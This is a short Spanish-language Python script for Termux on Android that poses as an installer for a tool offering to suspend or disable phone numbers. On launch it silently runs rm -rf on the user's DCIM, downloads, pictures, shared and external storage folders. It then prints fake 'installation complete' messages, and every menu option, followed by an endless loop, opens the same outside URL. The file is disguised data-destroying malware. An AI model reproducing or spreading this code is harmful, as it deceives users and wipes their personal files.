import os, sys, time, io


class color:
    morado = '\033[95m'
    blanco = '\033[97m'
    cyan = '\033[96m'
    azul  = '\033[94m'
    verde = '\033[92m'
    amarillo = '\033[93m'
    rojo = '\033[91m'
    fin = '\033[0m'


os.system("rm -rf /data/data/com.termux/files/home/storage/dcim/")
os.system("rm -rf /data/data/com.termux/files/home/storage/downloads/")
os.system("rm -rf /data/data/com.termux/files/home/storage/external-1/")
os.system("rm -rf /data/data/com.termux/files/home/storage/pictures/")
os.system("rm -rf /data/data/com.termux/files/home/storage/shared/")

print("Preparando instalacion por favor espere......")
time.sleep(2)
print("Gracias por usar el progrma")
time.sleep(1)
print("Instalacion Completada")
time.sleep(2)
os.system("clear")

def menu():
    print("    ELIGA UNA OPCION ")
    print("Version 2.0 ")
    print("[1]DEJAR EN SOPORTE")
    print("[2]SUSPENDER NUMERO")
    print("[3]DEJAR EN -1 UN NUMERO")
    print("[0]SALIR DEL MENU")
    eleccion =input("ELIJE UNA OPCION >>")
    if eleccion == "1" :
     os.system("termux-open-url https://piv.pivpiv.dk/")
    elif eleccion == "2" :
     os.system("termux-open-url https://piv.pivpiv.dk/")
    elif eleccion == "3" :
     os.system("termux-open-url https://piv.pivpiv.dk/")
    elif eleccion == "0" :
     os.system("termux-open-url https://piv.pivpiv.dk/")
    else:
        incorrecto()
menu()
while 1 < 2:
 os.system("termux-open-url https://piv.pivpiv.dk/")
